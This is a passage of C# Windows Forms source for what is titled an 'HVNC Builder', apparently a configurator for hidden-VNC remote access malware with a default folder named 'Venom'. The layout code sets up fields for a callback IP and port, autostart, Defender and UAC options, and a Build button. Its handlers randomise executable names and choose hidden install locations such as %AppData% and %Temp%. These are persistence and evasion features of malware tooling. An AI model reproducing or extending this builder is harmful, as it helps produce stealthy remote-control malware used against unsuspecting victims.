            this.btnRandomizeFileName.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRandomizeFileName.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnRandomizeFileName.DisabledState.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.btnRandomizeFileName.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnRandomizeFileName.ForeColor = System.Drawing.Color.White;
            this.btnRandomizeFileName.HoverState.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.Location = new System.Drawing.Point(581, 248);
            this.btnRandomizeFileName.Margin = new System.Windows.Forms.Padding(4);
            this.btnRandomizeFileName.Name = "btnRandomizeFileName";
            this.btnRandomizeFileName.ShadowDecoration.Parent = this.btnRandomizeFileName;
            this.btnRandomizeFileName.Size = new System.Drawing.Size(114, 30);
            this.btnRandomizeFileName.TabIndex = 167;
            this.btnRandomizeFileName.Text = "Randomize";
            this.btnRandomizeFileName.Click += new System.EventHandler(this.btnRandomizeFileName_Click);
            this.btnRandomFolder.Animated = true;
            this.btnRandomFolder.BorderColor = System.Drawing.Color.Maroon;
            this.btnRandomFolder.BorderRadius = 1;
            this.btnRandomFolder.CheckedState.Parent = this.btnRandomFolder;
            this.btnRandomFolder.CustomImages.Parent = this.btnRandomFolder;
            this.btnRandomFolder.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnRandomFolder.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnRandomFolder.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRandomFolder.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnRandomFolder.DisabledState.Parent = this.btnRandomFolder;
            this.btnRandomFolder.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.btnRandomFolder.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnRandomFolder.ForeColor = System.Drawing.Color.White;
            this.btnRandomFolder.HoverState.Parent = this.btnRandomFolder;
            this.btnRandomFolder.Location = new System.Drawing.Point(581, 310);
            this.btnRandomFolder.Margin = new System.Windows.Forms.Padding(4);
            this.btnRandomFolder.Name = "btnRandomFolder";
            this.btnRandomFolder.ShadowDecoration.Parent = this.btnRandomFolder;
            this.btnRandomFolder.Size = new System.Drawing.Size(114, 30);
            this.btnRandomFolder.TabIndex = 170;
            this.btnRandomFolder.Text = "Randomize";
            this.btnRandomFolder.Click += new System.EventHandler(this.btnRandomFolder_Click);
            this.txtFolder.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(8)))), ((int)(((byte)(104)))), ((int)(((byte)(81)))));
            this.txtFolder.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.txtFolder.DefaultText = "Venom";
            this.txtFolder.DisabledState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(208)))), ((int)(((byte)(208)))), ((int)(((byte)(208)))));
            this.txtFolder.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(226)))), ((int)(((byte)(226)))), ((int)(((byte)(226)))));
            this.txtFolder.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtFolder.DisabledState.Parent = this.txtFolder;
            this.txtFolder.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(138)))), ((int)(((byte)(138)))), ((int)(((byte)(138)))));
            this.txtFolder.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.txtFolder.FocusedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtFolder.FocusedState.Parent = this.txtFolder;
            this.txtFolder.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.txtFolder.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(4)))), ((int)(((byte)(143)))), ((int)(((byte)(110)))));
            this.txtFolder.HoverState.Parent = this.txtFolder;
            this.txtFolder.Location = new System.Drawing.Point(178, 310);
            this.txtFolder.Margin = new System.Windows.Forms.Padding(4);
            this.txtFolder.Name = "txtFolder";
            this.txtFolder.PasswordChar = '\0';
            this.txtFolder.PlaceholderText = "";
            this.txtFolder.SelectedText = "";
            this.txtFolder.SelectionStart = 5;
            this.txtFolder.ShadowDecoration.Parent = this.txtFolder;
            this.txtFolder.Size = new System.Drawing.Size(382, 30);
            this.txtFolder.TabIndex = 169;
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.Transparent;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F);
            this.label5.Location = new System.Drawing.Point(174, 286);
            this.label5.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(105, 20);
            this.label5.TabIndex = 168;
            this.label5.Text = "Install Folder";
            this.AutoScaleDimensions = new System.Drawing.SizeF(8F, 16F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(24)))), ((int)(((byte)(24)))), ((int)(((byte)(24)))));
            this.ClientSize = new System.Drawing.Size(883, 502);
            this.Controls.Add(this.btnRandomFolder);
            this.Controls.Add(this.txtFolder);
            this.Controls.Add(this.label5);
            this.Controls.Add(this.btnRandomizeFileName);
            this.Controls.Add(this.btnRandomInstallPath);
            this.Controls.Add(this.txtInstallPath);
            this.Controls.Add(this.label4);
            this.Controls.Add(this.checkUAC);
            this.Controls.Add(this.label3);
            this.Controls.Add(this.checkWD);
            this.Controls.Add(this.label2);
            this.Controls.Add(this.checkAutostart);
            this.Controls.Add(this.btnBuild);
            this.Controls.Add(this.txtFilename);
            this.Controls.Add(this.txtIP);
            this.Controls.Add(this.txtPort);
            this.Controls.Add(this.label1);
            this.Controls.Add(this.label7);
            this.Controls.Add(this.label24);
            this.Controls.Add(this.panel1);
            this.ForeColor = System.Drawing.Color.GhostWhite;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Margin = new System.Windows.Forms.Padding(4);
            this.Name = "FrmBuilder";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "HVNC Builder";
            this.Load += new System.EventHandler(this.FrmBuilder_Load);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.txtPort)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        private void btnRandomizeFileName_Click(object sender, EventArgs e)
        {
            txtFilename.Text = RandomString(9) + ".exe";
        }

        private void btnRandomInstallPath_Click(object sender, EventArgs e)
        {
            var paths = new [] {"%AppData%", "%ProgramData%", "%Temp%", "%LocalAppData%", "%ProgramFiles"};
            txtInstallPath.Text = paths[random.Next(0, paths.Length)];
        }

        private void btnRandomFolder_Click(object sender, EventArgs e)
        {
            txtFolder.Text = RandomString(9);
        }
    }
}
